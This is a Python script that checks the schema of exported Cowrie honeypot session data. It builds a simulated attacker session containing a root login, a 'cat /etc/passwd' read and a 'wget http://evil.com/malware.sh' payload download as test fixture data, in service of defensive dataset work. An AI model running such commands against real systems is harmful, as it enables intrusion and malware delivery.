#!/usr/bin/env python3
"""
Verify that session export schema is correct and stable.

This script validates that:
1. All required fields exist in exported sessions
2. Field types are correct
3. No unexpected null/empty values in critical fields

Run this before experiments to ensure data consistency.
You can also run it on an existing JSONL file to check data quality.

Usage:
    # Generate a test session and verify it
    python scripts/verify_session_schema.py

    # Verify an existing JSONL file
    python scripts/verify_session_schema.py --input sessions.jsonl
"""

import argparse
import json
import sys
from pathlib import Path
from datetime import datetime

# add src to path so we can import our modules
sys.path.insert(0, str(Path(__file__).parent.parent / "src"))


# these fields must exist in every exported session
REQUIRED_FIELDS = [
    "session_id",
    "location",
    "src_ip",
    "protocol",
    "auth_success",
    "commands",
    "features",
    "labels_rule_based",
    "session_type",
    "event_count",
]

# these fields must exist in labels_rule_based
REQUIRED_LABEL_FIELDS = [
    "level",
    "primary_tactic",
    "all_tactics",
    "matched_patterns",
]

# some features we expect to always have
REQUIRED_FEATURES = [
    "F38_messages_per_sec",  # timing feature
    "F44_duration",  # host feature
    "extra_num_commands",  # bonus feature
]


def verify_session(session_dict: dict) -> list[str]:
    """
    Verify a single session dict.

    Returns a list of error messages (empty list = all good).
    """
    errors = []

    # check top-level required fields
    for field in REQUIRED_FIELDS:
        if field not in session_dict:
            errors.append(f"missing required field: {field}")

    # check labels structure
    labels = session_dict.get("labels_rule_based", {})
    for field in REQUIRED_LABEL_FIELDS:
        if field not in labels:
            errors.append(f"missing label field: {field}")

    # check features
    features = session_dict.get("features", {})
    for field in REQUIRED_FEATURES:
        if field not in features:
            errors.append(f"missing feature: {field}")

    # type checks
    if "level" in labels and not isinstance(labels["level"], int):
        errors.append(f"labels.level should be int, got {type(labels['level']).__name__}")

    if "all_tactics" in labels and not isinstance(labels["all_tactics"], list):
        errors.append(f"labels.all_tactics should be list, got {type(labels['all_tactics']).__name__}")

    if "commands" in session_dict and not isinstance(session_dict["commands"], list):
        errors.append(f"commands should be list, got {type(session_dict['commands']).__name__}")

    return errors


def create_test_session():
    """
    Create a minimal test session to verify the export pipeline works.

    This simulates what you'd get from processing real log files.
    """
    from cowrie_dataset.aggregators import Session
    from cowrie_dataset.export import export_session

    # create a fake session with some realistic data
    session = Session(
        session_id="test123abc",
        location="test-honeypot",
    )

    # simulate connection event
    session.src_ip = "192.0.2.100"  # TEST-NET-1 range
    session.src_port = 54321
    session.dst_port = 22
    session.protocol = 1  # ssh

    # simulate successful login
    session.login_attempts.append(("root", "password123", True))
    session.auth_success = True
    session.final_username = "root"
    session.final_password = "password123"

    # simulate some commands
    session.commands.append({
        "timestamp": datetime.now(),
        "input": "uname -a",
        "success": True,
    })
    session.commands.append({
        "timestamp": datetime.now(),
        "input": "cat /etc/passwd",
        "success": True,
    })
    session.commands.append({
        "timestamp": datetime.now(),
        "input": "wget http://evil.com/malware.sh",
        "success": True,
    })

    # set timestamps
    session.start_ts = datetime.now()
    session.end_ts = datetime.now()
    session.event_count = 10

    # export it
    exported = export_session(session)
    return exported.to_dict()


def verify_jsonl_file(input_path: Path, max_errors: int = 10):
    """
    Verify all sessions in a JSONL file.

    Returns (total_count, error_count, sample_errors)
    """
    total = 0
    error_count = 0
    sample_errors = []

    with open(input_path) as f:
        for line_num, line in enumerate(f, 1):
            line = line.strip()
            if not line:
                continue

            total += 1
            try:
                session = json.loads(line)
                errors = verify_session(session)
                if errors:
                    error_count += 1
                    if len(sample_errors) < max_errors:
                        sample_errors.append({
                            "line": line_num,
                            "session_id": session.get("session_id", "unknown"),
                            "errors": errors,
                        })
            except json.JSONDecodeError as e:
                error_count += 1
                if len(sample_errors) < max_errors:
                    sample_errors.append({
                        "line": line_num,
                        "errors": [f"JSON parse error: {e}"],
                    })

    return total, error_count, sample_errors


def main():
    parser = argparse.ArgumentParser(description="Verify session export schema")
    parser.add_argument(
        "--input", "-i",
        type=Path,
        help="JSONL file to verify (if not provided, creates a test session)",
    )
    parser.add_argument(
        "--verbose", "-v",
        action="store_true",
        help="Print full session on success",
    )
    args = parser.parse_args()

    if args.input:
        # verify existing file
        print(f"Verifying {args.input}...")
        total, error_count, sample_errors = verify_jsonl_file(args.input)

        print(f"\nResults:")
        print(f"  Total sessions: {total:,}")
        print(f"  With errors: {error_count:,}")
        print(f"  Success rate: {(total - error_count) / total * 100:.1f}%" if total > 0 else "N/A")

        if sample_errors:
            print(f"\nSample errors (first {len(sample_errors)}):")
            for err in sample_errors:
                print(f"  Line {err.get('line', '?')}: {err.get('session_id', '?')}")
                for e in err.get('errors', []):
                    print(f"    - {e}")

        sys.exit(1 if error_count > 0 else 0)

    else:
        # test with a generated session
        print("Creating test session...")
        try:
            session_dict = create_test_session()
        except Exception as e:
            print(f"FAIL: Could not create test session: {e}")
            sys.exit(1)

        print("Verifying schema...")
        errors = verify_session(session_dict)

        if errors:
            print(f"\nFAIL: {len(errors)} error(s) found:")
            for e in errors:
                print(f"  - {e}")
            sys.exit(1)
        else:
            print("\nOK: All schema checks passed")

            if args.verbose:
                print("\nExported session:")
                print(json.dumps(session_dict, indent=2, default=str))

            # print a quick summary of what we got
            print(f"\nSession summary:")
            print(f"  session_id: {session_dict['session_id']}")
            print(f"  commands: {len(session_dict['commands'])}")
            print(f"  features: {len(session_dict['features'])} extracted")
            print(f"  label level: {session_dict['labels_rule_based']['level']}")
            print(f"  primary tactic: {session_dict['labels_rule_based']['primary_tactic']}")

            sys.exit(0)


if __name__ == "__main__":
    main()
